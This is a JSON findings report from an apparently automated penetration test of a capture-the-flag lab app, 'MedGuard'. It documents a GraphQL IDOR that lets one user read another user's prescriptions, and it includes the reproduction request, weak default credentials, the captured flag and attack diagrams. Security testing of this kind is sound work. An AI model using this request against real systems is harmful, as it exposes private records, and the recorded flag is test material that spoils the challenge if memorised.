@@ -1,0 +1,54 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:51:31.606069+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "97ccb2ed-1a19-4d66-9e89-47e24220d44c",
+      "timestamp": "2026-04-13T11:51:31.606012+00:00",
+      "title": "IDOR via GraphQL - Access Other Users' Prescriptions Including Flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:45673/graphql",
+      "description": "The GraphQL API endpoint exposes an Insecure Direct Object Reference (IDOR) vulnerability in the getPrescriptions query. Any authenticated user can query prescriptions belonging to any other user by manipulating the userId parameter. The PrescriptionType schema includes a 'flag' field that contains the CTF flag in user 1 (admin)'s prescription #43. No authorization check prevents user 2 from reading user 1's prescription data including the flag field.",
+      "evidence": "GraphQL query as user 2 (session cookie for userID=2):\nPOST /graphql\n{\"query\": \"{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }\"}\n\nResponse prescription #43:\n{\"id\":43,\"userId\":1,\"prescriptionDetails\":\"Prescription 43 for Admin\",\"flag\":\"FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fec5949b8d}\"}\n\nCTF FLAG: FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fec5949b8d}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST http://172.17.0.1:45673/graphql\nContent-Type: application/json\nCookie: session=<any_authenticated_session>\n\n{\"query\": \"{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }\"}",
+        "expected": "Returns all of admin user's prescriptions including the flag field in prescription #43"
+      }
+    },
+    {
+      "id": "14ddd1e3-ef76-45b0-b0f8-410498d98f1d",
+      "timestamp": "2026-04-13T11:52:42.611414+00:00",
+      "title": "IDOR via GraphQL \u2014 Unauthenticated Access to Other Users' Prescriptions + Flag Extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:45673/graphql",
+      "description": "The MedGuard application uses GraphQL with a `getPrescriptions(userId: Int)` query. The `userId` parameter is taken directly from client-side localStorage and passed to the GraphQL endpoint with no server-side authorization check. Any authenticated user can enumerate and read prescriptions belonging to any other user by simply changing the `userId` value.\n\nAdditionally, the GraphQL `PrescriptionType` includes a `flag` field that the frontend deliberately omits from its query (with a comment 'dont pass flag in query parameter because it will fetched'), but the field is still fully accessible via direct GraphQL queries. This security-through-obscurity approach fails completely.\n\nExploit chain:\n1. Login with `user:user` (userID=2, default/weak credentials)\n2. POST to /graphql with `query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }`\n3. Flag returned in prescription ID 43.",
+      "evidence": "GraphQL response for userId=1:\n{\"id\":43,\"userId\":1,\"prescriptionDetails\":\"Prescription 43 for Admin\",\"flag\":\"FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fec5949b8d}\"}\n\nFLAG: FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fec5949b8d}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /graphql HTTP/1.1\nHost: 172.17.0.1:45673\nContent-Type: application/json\nCookie: <valid-session>\n\n{\"query\": \"query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }\"}",
+        "expected": "Returns admin's prescriptions including the flag in prescription ID 43"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "fde2a785-95a6-4124-b8bc-b0bc3af07099",
+      "timestamp": "2026-04-13T11:51:43.644455+00:00",
+      "title": "MedGuard Application Architecture",
+      "mermaid": "graph TD\n    A[Attacker - User 2] -->|POST /login user:user/user| B[Flask Login Endpoint]\n    B -->|Returns userID=2 + session cookie| A\n    A -->|GraphQL POST /graphql userId=1| C[GraphQL API]\n    C -->|IDOR - No auth check on userId| D[SQLite Database]\n    D -->|Returns ALL prescriptions for userId=1 incl. flag| C\n    C -->|flag: FLAG{...} in prescription 43| A\n    \n    E[Admin User 1] -->|Legitimate access| C\n    \n    subgraph MedGuard App - Flask/Python 3.8\n        B\n        C\n        F[/add_prescription page]\n        G[/view_prescriptions page]\n    end\n    \n    subgraph Database\n        D\n        D1[Users Table: id, username, password]\n        D2[Prescriptions Table: id, userId, prescriptionDetails, flag]\n    end\n    \n    D --- D1\n    D --- D2"
+    },
+    {
+      "id": "25dc3fa3-d198-4a30-b273-72ab3f1a0dd8",
+      "timestamp": "2026-04-13T11:52:52.898920+00:00",
+      "title": "MedGuard Attack Surface",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Login[\"/login (POST JSON)\"]\n  Browser --> GraphQL[\"/graphql (POST)\"]\n  Browser --> AddRx[\"/add_prescription (GET, auth required)\"]\n  Browser --> ViewRx[\"/view_prescriptions (GET, auth required)\"]\n  Login --> Session[\"Flask Session Cookie + userID in localStorage\"]\n  Session --> GraphQL\n  GraphQL --> QueryRx[\"getPrescriptions(userId: INT) - NO authz check\"]\n  GraphQL --> MutateRx[\"addPrescription(userId: INT, details: STR)\"]\n  QueryRx --> DB[(\"SQLite DB - prescriptions table\")]\n  MutateRx --> DB\n  DB --> Flag[\"FLAG field in prescription id=43 (userId=1)\"]\n  style Flag fill:#ff4444,color:#fff"
+    }
+  ]
+}
